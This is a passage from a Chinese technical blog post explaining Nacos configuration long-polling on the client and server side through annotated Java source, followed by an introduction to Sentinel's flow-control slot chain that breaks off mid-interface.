class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// check failover config</span></span><br><span class="line">            <span class="comment">// 遍历本地缓存的配置</span></span><br><span class="line">            <span class="keyword">for</span> (CacheData cacheData : cacheMap.values()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cacheData.getTaskId() == taskId) &#123;</span><br><span class="line">                    cacheDatas.add(cacheData);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 检查本地配置</span></span><br><span class="line">                        checkLocalConfig(cacheData);</span><br><span class="line">                        <span class="keyword">if</span> (cacheData.isUseLocalConfigInfo()) &#123;</span><br><span class="line">                            cacheData.checkListenerMd5();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        LOGGER.error(<span class="string">&quot;get local config info error&quot;</span>, e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// check server config</span></span><br><span class="line">            <span class="comment">// 通过长轮询检查服务端配置</span></span><br><span class="line">            List&lt;String&gt; changedGroupKeys = checkUpdateDataIds(cacheDatas, inInitializingCacheList);</span><br><span class="line">            <span class="keyword">if</span> (!CollectionUtils.isEmpty(changedGroupKeys)) &#123;</span><br><span class="line">                LOGGER.info(<span class="string">&quot;get changedGroupKeys:&quot;</span> + changedGroupKeys);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> (String groupKey : changedGroupKeys) &#123;</span><br><span class="line">                String[] key = GroupKey.parseKey(groupKey);</span><br><span class="line">                <span class="type">String</span> <span class="variable">dataId</span> <span class="operator">=</span> key[<span class="number">0</span>];</span><br><span class="line">                <span class="type">String</span> <span class="variable">group</span> <span class="operator">=</span> key[<span class="number">1</span>];</span><br><span class="line">                <span class="type">String</span> <span class="variable">tenant</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (key.length == <span class="number">3</span>) &#123;</span><br><span class="line">                    tenant = key[<span class="number">2</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    String[] ct = getServerConfig(dataId, group, tenant, <span class="number">3000L</span>);</span><br><span class="line">                    <span class="type">CacheData</span> <span class="variable">cache</span> <span class="operator">=</span> cacheMap.get(GroupKey.getKeyTenant(dataId, group, tenant));</span><br><span class="line">                    cache.setContent(ct[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="literal">null</span> != ct[<span class="number">1</span>]) &#123;</span><br><span class="line">                        cache.setType(ct[<span class="number">1</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    LOGGER.info(<span class="string">&quot;[&#123;&#125;] [data-received] dataId=&#123;&#125;, group=&#123;&#125;, tenant=&#123;&#125;, md5=&#123;&#125;, content=&#123;&#125;, type=&#123;&#125;&quot;</span>,</span><br><span class="line">                            agent.getName(), dataId, group, tenant, cache.getMd5(),</span><br><span class="line">                            ContentUtils.truncateContent(ct[<span class="number">0</span>]), ct[<span class="number">1</span>]);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NacosException ioe) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> String</span><br><span class="line">                            .format(<span class="string">&quot;[%s] [get-update] get changed config exception. dataId=%s, group=%s, tenant=%s&quot;</span>,</span><br><span class="line">                                    agent.getName(), dataId, group, tenant);</span><br><span class="line">                    LOGGER.error(message, ioe);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (CacheData cacheData : cacheDatas) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!cacheData.isInitializing() || inInitializingCacheList</span><br><span class="line">                        .contains(GroupKey.getKeyTenant(cacheData.dataId, cacheData.group, cacheData.tenant))) &#123;</span><br><span class="line">                    cacheData.checkListenerMd5();</span><br><span class="line">                    cacheData.setInitializing(<span class="literal">false</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            inInitializingCacheList.clear();</span><br><span class="line">            </span><br><span class="line">            executorService.execute(<span class="built_in">this</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// If the rotation training task is abnormal, the next execution time of the task will be punished</span></span><br><span class="line">            LOGGER.error(<span class="string">&quot;longPolling error : &quot;</span>, e);</span><br><span class="line">            executorService.schedule(<span class="built_in">this</span>, taskPenaltyTime, TimeUnit.MILLISECONDS);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面有个 checkUpdateDataIds 方法，用于获取发生变更了的配置文件的dataId列表，它同样位于 ClientWorker 内。如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Fetch the dataId list from server.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> cacheDatas              CacheDatas for config infomations.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> inInitializingCacheList initial cache lists.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> String include dataId and group (ps: it maybe null).</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception Exception.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">List&lt;String&gt; <span class="title function_">checkUpdateDataIds</span><span class="params">(List&lt;CacheData&gt; cacheDatas, List&lt;String&gt; inInitializingCacheList)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 拼接出配置文件的唯一标识</span></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">    <span class="keyword">for</span> (CacheData cacheData : cacheDatas) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!cacheData.isUseLocalConfigInfo()) &#123;</span><br><span class="line">            sb.append(cacheData.dataId).append(WORD_SEPARATOR);</span><br><span class="line">            sb.append(cacheData.group).append(WORD_SEPARATOR);</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.isBlank(cacheData.tenant)) &#123;</span><br><span class="line">                sb.append(cacheData.getMd5()).append(LINE_SEPARATOR);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sb.append(cacheData.getMd5()).append(WORD_SEPARATOR);</span><br><span class="line">                sb.append(cacheData.getTenant()).append(LINE_SEPARATOR);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cacheData.isInitializing()) &#123;</span><br><span class="line">                <span class="comment">// It updates when cacheData occours in cacheMap by first time.</span></span><br><span class="line">                inInitializingCacheList</span><br><span class="line">                        .add(GroupKey.getKeyTenant(cacheData.dataId, cacheData.group, cacheData.tenant));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isInitializingCacheList</span> <span class="operator">=</span> !inInitializingCacheList.isEmpty();</span><br><span class="line">    <span class="keyword">return</span> checkUpdateConfigStr(sb.toString(), isInitializingCacheList);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Fetch the updated dataId list from server.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> probeUpdateString       updated attribute string value.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> isInitializingCacheList initial cache lists.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> The updated dataId list(ps: it maybe null).</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException Exception.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">List&lt;String&gt; <span class="title function_">checkUpdateConfigStr</span><span class="params">(String probeUpdateString, <span class="type">boolean</span> isInitializingCacheList)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    </span><br><span class="line">    Map&lt;String, String&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;(<span class="number">2</span>);</span><br><span class="line">    params.put(Constants.PROBE_MODIFY_REQUEST, probeUpdateString);</span><br><span class="line">    Map&lt;String, String&gt; headers = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 长轮询的超时时间</span></span><br><span class="line">    headers.put(<span class="string">&quot;Long-Pulling-Timeout&quot;</span>, <span class="string">&quot;&quot;</span> + timeout);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// told server do not hang me up if new initializing cacheData added in</span></span><br><span class="line">    <span class="keyword">if</span> (isInitializingCacheList) &#123;</span><br><span class="line">        headers.put(<span class="string">&quot;Long-Pulling-Timeout-No-Hangup&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isBlank(probeUpdateString)) &#123;</span><br><span class="line">        <span class="keyword">return</span> Collections.emptyList();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// In order to prevent the server from handling the delay of the client&#x27;s long task,</span></span><br><span class="line">        <span class="comment">// increase the client&#x27;s read timeout to avoid this problem.</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">long</span> <span class="variable">readTimeoutMs</span> <span class="operator">=</span> timeout + (<span class="type">long</span>) Math.round(timeout &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 向服务端发起一个http请求，该请求在服务端配置没有变更的情况下默认会hang住30s</span></span><br><span class="line">        HttpRestResult&lt;String&gt; result = agent</span><br><span class="line">                .httpPost(Constants.CONFIG_CONTROLLER_PATH + <span class="string">&quot;/listener&quot;</span>, headers, params, agent.getEncode(),</span><br><span class="line">                        readTimeoutMs);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (result.ok()) &#123;</span><br><span class="line">            setHealthServer(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 响应状态是成功则解析响应体得到 dataId、group、tenant 等信息并返回</span></span><br><span class="line">            <span class="keyword">return</span> parseUpdateDataIdResponse(result.getData());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setHealthServer(<span class="literal">false</span>);</span><br><span class="line">            LOGGER.error(<span class="string">&quot;[&#123;&#125;] [check-update] get changed dataId error, code: &#123;&#125;&quot;</span>, agent.getName(),</span><br><span class="line">                    result.getCode());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        setHealthServer(<span class="literal">false</span>);</span><br><span class="line">        LOGGER.error(<span class="string">&quot;[&quot;</span> + agent.getName() + <span class="string">&quot;] [check-update] get changed dataId exception&quot;</span>, e);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Collections.emptyList();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端对 listener 接口的请求会进入到服务端的 com.alibaba.nacos.config.server.controller.ConfigController#listener 方法进行处理，该方法主要是调用了 com.alibaba.nacos.config.server.controller.ConfigServletInner#doPollingConfig 方法。代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 轮询接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">doPollingConfig</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span><br><span class="line"><span class="params">                              Map&lt;String, String&gt; clientMd5Map, <span class="type">int</span> probeRequestSize)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果支持长轮询则进入长轮询的流程</span></span><br><span class="line">    <span class="keyword">if</span> (LongPollingService.isSupportLongPolling(request)) &#123;</span><br><span class="line">        longPollingService.addLongPollingClient(request, response, clientMd5Map, probeRequestSize);</span><br><span class="line">        <span class="keyword">return</span> HttpServletResponse.SC_OK + <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// else 兼容短轮询逻辑</span></span><br><span class="line">    List&lt;String&gt; changedGroups = MD5Util.compareMd5(request, response, clientMd5Map);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 兼容短轮询result</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">oldResult</span> <span class="operator">=</span> MD5Util.compareMd5OldResult(changedGroups);</span><br><span class="line">    <span class="type">String</span> <span class="variable">newResult</span> <span class="operator">=</span> MD5Util.compareMd5ResultString(changedGroups);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">version</span> <span class="operator">=</span> request.getHeader(Constants.CLIENT_VERSION_HEADER);</span><br><span class="line">    <span class="keyword">if</span> (version == <span class="literal">null</span>) &#123;</span><br><span class="line">        version = <span class="string">&quot;2.0.0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">versionNum</span> <span class="operator">=</span> Protocol.getVersionNumber(version);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 2.0.4版本以前, 返回值放入header中</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (versionNum &lt; START_LONGPOLLING_VERSION_NUM) &#123;</span><br><span class="line">        response.addHeader(Constants.PROBE_MODIFY_RESPONSE, oldResult);</span><br><span class="line">        response.addHeader(Constants.PROBE_MODIFY_RESPONSE_NEW, newResult);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;content&quot;</span>, newResult);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 禁用缓存</span></span><br><span class="line">    response.setHeader(<span class="string">&quot;Pragma&quot;</span>, <span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line">    response.setDateHeader(<span class="string">&quot;Expires&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    response.setHeader(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-cache,no-store&quot;</span>);</span><br><span class="line">    response.setStatus(HttpServletResponse.SC_OK);</span><br><span class="line">    <span class="keyword">return</span> HttpServletResponse.SC_OK + <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们主要关注上面的 com.alibaba.nacos.config.server.service.LongPollingService#addLongPollingClient 长轮询流程的方法。代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addLongPollingClient</span><span class="params">(HttpServletRequest req, HttpServletResponse rsp, Map&lt;String, String&gt; clientMd5Map,</span></span><br><span class="line"><span class="params">                                 <span class="type">int</span> probeRequestSize)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> req.getHeader(LongPollingService.LONG_POLLING_HEADER);</span><br><span class="line">    <span class="type">String</span> <span class="variable">noHangUpFlag</span> <span class="operator">=</span> req.getHeader(LongPollingService.LONG_POLLING_NO_HANG_UP_HEADER);</span><br><span class="line">    <span class="type">String</span> <span class="variable">appName</span> <span class="operator">=</span> req.getHeader(RequestUtil.CLIENT_APPNAME_HEADER);</span><br><span class="line">    <span class="type">String</span> <span class="variable">tag</span> <span class="operator">=</span> req.getHeader(<span class="string">&quot;Vipserver-Tag&quot;</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">delayTime</span> <span class="operator">=</span> SwitchService.getSwitchInteger(SwitchService.FIXED_DELAY_TIME, <span class="number">500</span>);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提前500ms返回响应，为避免客户端超时 <span class="doctag">@qiaoyi</span>.dingqy 2013.10.22改动  add delay time for LoadBalance</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">timeout</span> <span class="operator">=</span> Math.max(<span class="number">10000</span>, Long.parseLong(str) - delayTime);</span><br><span class="line">    <span class="keyword">if</span> (isFixedPolling()) &#123;</span><br><span class="line">        timeout = Math.max(<span class="number">10000</span>, getFixedPollingInterval());</span><br><span class="line">        <span class="comment">// do nothing but set fix polling timeout</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        List&lt;String&gt; changedGroups = MD5Util.compareMd5(req, rsp, clientMd5Map);</span><br><span class="line">        <span class="keyword">if</span> (changedGroups.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            generateResponse(req, rsp, changedGroups);</span><br><span class="line">            LogUtil.clientLog.info(<span class="string">&quot;&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;&quot;</span>,</span><br><span class="line">                System.currentTimeMillis() - start, <span class="string">&quot;instant&quot;</span>, RequestUtil.getRemoteIp(req), <span class="string">&quot;polling&quot;</span>,</span><br><span class="line">                clientMd5Map.size(), probeRequestSize, changedGroups.size());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (noHangUpFlag != <span class="literal">null</span> &amp;&amp; noHangUpFlag.equalsIgnoreCase(TRUE_STR)) &#123;</span><br><span class="line">            LogUtil.clientLog.info(<span class="string">&quot;&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;&quot;</span>, System.currentTimeMillis() - start, <span class="string">&quot;nohangup&quot;</span>,</span><br><span class="line">                RequestUtil.getRemoteIp(req), <span class="string">&quot;polling&quot;</span>, clientMd5Map.size(), probeRequestSize,</span><br><span class="line">                changedGroups.size());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> RequestUtil.getRemoteIp(req);</span><br><span class="line">    <span class="comment">// 一定要由HTTP线程调用，否则离开后容器会立即发送响应</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">AsyncContext</span> <span class="variable">asyncContext</span> <span class="operator">=</span> req.startAsync();</span><br><span class="line">    <span class="comment">// AsyncContext.setTimeout()的超时时间不准，所以只能自己控制</span></span><br><span class="line">    asyncContext.setTimeout(<span class="number">0L</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 ClientLongPolling 的 run 方法会将 ClientLongPolling 实例（携带了本次请求的相关信息）放入 allSubs 中，然后会在29.5s后再执行另一个 Runnable，该 Runnable 用于等待29.5s后依旧没有相应的配置变更时对客户端进行响应，并将相应的 ClientLongPolling 实例从 allSubs 中移出</span></span><br><span class="line">    scheduler.execute(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClientLongPolling</span>(asyncContext, clientMd5Map, ip, probeRequestSize, timeout, appName, tag));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 LongPollingService 实现了 AbstractEventListener，也就是说能接收事件通知，在其 com.alibaba.nacos.config.server.service.LongPollingService#onEvent 方法中可以看到，它关注的是 LocalDataChangeEvent 事件：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onEvent</span><span class="params">(Event event)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isFixedPolling()) &#123;</span><br><span class="line">        <span class="comment">// ignore</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (event <span class="keyword">instanceof</span> LocalDataChangeEvent) &#123;</span><br><span class="line">            <span class="type">LocalDataChangeEvent</span> <span class="variable">evt</span> <span class="operator">=</span> (LocalDataChangeEvent)event;</span><br><span class="line">            scheduler.execute(<span class="keyword">new</span> <span class="title class_">DataChangeTask</span>(evt.groupKey, evt.isBeta, evt.betaIps));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在nacos上修改配置后就会产生 LocalDataChangeEvent 事件，此时 LongPollingService 也就能监听到，当收到该事件时就会遍历 allSubs，找到匹配的请求并将 groupKey 返回给客户端。具体代码在 DataChangeTask 中：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DataChangeTask</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ConfigService.getContentBetaMd5(groupKey);</span><br><span class="line">            <span class="keyword">for</span> (Iterator&lt;ClientLongPolling&gt; iter = allSubs.iterator(); iter.hasNext(); ) &#123;</span><br><span class="line">                <span class="type">ClientLongPolling</span> <span class="variable">clientSub</span> <span class="operator">=</span> iter.next();</span><br><span class="line">                <span class="keyword">if</span> (clientSub.clientMd5Map.containsKey(groupKey)) &#123;</span><br><span class="line">                    <span class="comment">// 如果beta发布且不在beta列表直接跳过</span></span><br><span class="line">                    <span class="keyword">if</span> (isBeta &amp;&amp; !betaIps.contains(clientSub.ip)) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 如果tag发布且不在tag列表直接跳过</span></span><br><span class="line">                    <span class="keyword">if</span> (StringUtils.isNotBlank(tag) &amp;&amp; !tag.equals(clientSub.tag)) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    getRetainIps().put(clientSub.ip, System.currentTimeMillis());</span><br><span class="line">                    iter.remove(); <span class="comment">// 删除订阅关系</span></span><br><span class="line">                    LogUtil.clientLog.info(<span class="string">&quot;&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;&quot;</span>,</span><br><span class="line">                        (System.currentTimeMillis() - changeTime),</span><br><span class="line">                        <span class="string">&quot;in-advance&quot;</span>,</span><br><span class="line">                        RequestUtil.getRemoteIp((HttpServletRequest)clientSub.asyncContext.getRequest()),</span><br><span class="line">                        <span class="string">&quot;polling&quot;</span>,</span><br><span class="line">                        clientSub.clientMd5Map.size(), clientSub.probeRequestSize, groupKey);</span><br><span class="line">                    clientSub.sendResponse(Arrays.asList(groupKey));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            LogUtil.defaultLog.error(<span class="string">&quot;data change error:&quot;</span> + t.getMessage(), t.getCause());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DataChangeTask(String groupKey) &#123;</span><br><span class="line">        <span class="built_in">this</span>(groupKey, <span class="literal">false</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DataChangeTask(String groupKey, <span class="type">boolean</span> isBeta, List&lt;String&gt; betaIps) &#123;</span><br><span class="line">        <span class="built_in">this</span>(groupKey, isBeta, betaIps, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DataChangeTask(String groupKey, <span class="type">boolean</span> isBeta, List&lt;String&gt; betaIps, String tag) &#123;</span><br><span class="line">        <span class="built_in">this</span>.groupKey = groupKey;</span><br><span class="line">        <span class="built_in">this</span>.isBeta = isBeta;</span><br><span class="line">        <span class="built_in">this</span>.betaIps = betaIps;</span><br><span class="line">        <span class="built_in">this</span>.tag = tag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> String groupKey;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">changeTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> isBeta;</span><br><span class="line">    <span class="keyword">final</span> List&lt;String&gt; betaIps;</span><br><span class="line">    <span class="keyword">final</span> String tag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当客户端收到变更的dataid+group后，就会去服务端获取最新的配置数据，并更新本地数据 cacheData，然后发送数据变更事件，整个流程结束。</p><ul><li>获取服务端最新配置数据的方法：com.alibaba.nacos.client.config.impl.ClientWorker#getServerConfig</li><li>发送数据变更事件的方法：com.alibaba.nacos.client.config.impl.CacheData#checkListenerMd5</li></ul><h2 id="Sentienl"><a href="#Sentienl" class="headerlink" title="Sentienl"></a>Sentienl</h2><p>Sentinel是阿里巴巴开源的一款流量控制和熔断降级框架，主要用于微服务架构中服务的流量控制和熔断降级。其限流实现原理主要分为两个部分：</p><blockquote><p>统计信息收集</p></blockquote><p>Sentinel会在运行过程中对服务的各种统计信息进行收集，包括请求的响应时间、请求通过的QPS（每秒查询率）、线程池队列大小等指标。这些指标通过定义的规则进行分析，判断当前请求是否超过了设定的阈值。</p><blockquote><p>阈值判断</p></blockquote><p>Sentinel根据收集到的统计信息，通过定义的规则对请求进行判断。规则中包括以下几个要素：</p><p>资源名：对哪个资源进行限流<br>流控模式：直接拒绝或者匀速通过<br>流控阈值：单位时间内允许通过的请求个数<br>统计时间窗口：多长时间内统计一次流量，单位秒<br>降级处理：当请求超过阈值时的处理策略，如直接拒绝、返回默认值等<br>Sentinel会根据以上规则进行限流，当请求超过阈值时，根据设置的降级处理策略进行处理，比如直接拒绝请求、返回默认值等。同时，Sentinel还可以进行自适应的流控，根据实际情况调整阈值，保证服务的可用性和稳定性。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><h4 id="Slot-插槽"><a href="#Slot-插槽" class="headerlink" title="Slot 插槽"></a>Slot 插槽</h4><p>在 Sentinel 里面，所有的资源都对应一个资源名称（resourceName），每次资源调用都会创建一个 Entry 对象。Entry 可以通过对主流框架的适配自动创建，也可以通过注解的方式或调用 SphU API 显式创建。Entry 创建的时候，同时也会创建一系列功能插槽（slot chain），这些插槽有不同的职责，例如:</p><ul><li>NodeSelectorSlot 负责收集资源的路径，并将这些资源的调用路径，以树状结构存储起来，用于根据调用路径来限流降级；</li><li>ClusterBuilderSlot 则用于存储资源的统计信息以及调用者信息，例如该资源的 RT, QPS, thread count 等等，这些信息将用作为多维度限流，降级的依据；</li><li>StatisticSlot 则用于记录、统计不同纬度的 runtime 指标监控信息；</li><li>FlowSlot 则用于根据预设的限流规则以及前面 slot 统计的状态，来进行流量控制；</li><li>AuthoritySlot 则根据配置的黑白名单和调用来源信息，来做黑白名单控制；</li><li>DegradeSlot 则通过统计信息以及预设的规则，来做熔断降级；</li><li>SystemSlot 则通过系统的状态，例如 load1 等，来控制总的入口流量；</li></ul><p>Sentinel 提供了插槽接口 ProcessorSlot，其中提供了方法 enrty 处理进入请求 和 exit 处理请求结束操作</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ProcessorSlot</span>&lt;T&gt; &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Entrance of this slot.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context         current &#123;<span class="doctag">@link</span> Context&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resourceWrapper current resource</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> param           generics parameter, usually is a &#123;<span class="doctag">@link</span> com.alibaba.csp.sentinel.node.Node&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> count           tokens needed</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> prioritized     whether the entry is prioritized</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args            parameters of the original call</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Throwable blocked exception or unexpected error</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">entry</span><span class="params">(Context context, ResourceWrapper resourceWrapper, T param, <span class="type">int</span> count, <span class="type">boolean</span> prioritized,</span></span><br><span class="line"><span class="params">               Object... args)</span> <span class="keyword">throws</span> Throwable;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Means finish of &#123;<span class="doctag">@link</span> #entry(Context, ResourceWrapper, Object, int, boolean, Object...)&#125;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context         current &#123;<span class="doctag">@link</span> Context&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resourceWrapper current resource</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> obj             relevant object (e.g. Node)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> count           tokens needed</span></span><br><span class="line"><span class="comment">     * <span 